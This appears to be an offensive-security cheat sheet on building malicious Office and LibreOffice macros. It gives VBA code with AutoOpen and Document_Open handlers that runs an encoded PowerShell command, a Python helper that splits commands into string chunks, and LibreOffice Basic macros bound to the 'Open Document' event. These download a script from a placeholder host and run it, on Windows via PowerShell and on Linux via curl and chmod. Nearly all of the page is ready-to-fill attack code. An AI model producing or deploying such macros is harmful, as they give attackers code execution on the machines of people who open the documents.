# Macro

## Microsoft Office Macro

Creates a VBA macro in Microsoft Office to execute a PowerShell command.

### Macro Setup

Go to View > Macro, enter a name, and add the following code:

```vba
Sub AutoOpen()
    <macro_name>
End Sub

Sub Document_Open()
    <macro_name>
End Sub

Sub <macro_name>()
    Dim Str As String
    Str = Str + "powershell -e "
    Str = Str + "<base64_command>"
    CreateObject("Wscript.Shell").Run Str
End Sub
```

## LibreOffice Macro

Creates a Basic macro in LibreOffice to execute commands, assigned to the "Open Document" event.

### Macro Setup

Go to Tools > Macros > Organize Macros > LibreOffice Basic, name and create the macro.

#### **Windows**

Split command into smaller string:

```python
s = input("Enter your command: ")
s = 'cmd /c ' + s
n = 50
print('Macro command:')
for i in range(0, len(s), n):
	chunk = s[i:i + n]
	print('Str = Str + "' + chunk + '"')
```

Execute the PowerShell script:

```vba
Sub Main
    Dim Str As String
    ...
    Shell(Str)
End Sub
```

Downloads and executes a PowerShell script:

{% code overflow="wrap" %}

```vba
Sub Main
    Shell("cmd /c powershell iwr http://<target_ip>:<port>/<file>.ps1 -o C:/Windows/Temp/<file>.ps1")
    Shell("cmd /c powershell -c C:/Windows/Temp/<file>.ps1")
End Sub
```

{% endcode %}

#### **Linux**

Downloads and executes a shell script:

```vba
Sub Main
    Shell("bash -c 'curl -o /tmp/<file>.sh http://<target_ip>:<port>/<file>.sh'")
    Shell("bash -c 'chmod +x /tmp/<file>.sh'")
    Shell("bash -c '/tmp/<file>.sh'")
End Sub
```

Then assign it to "Open Document" via Tools > Customize > Events.
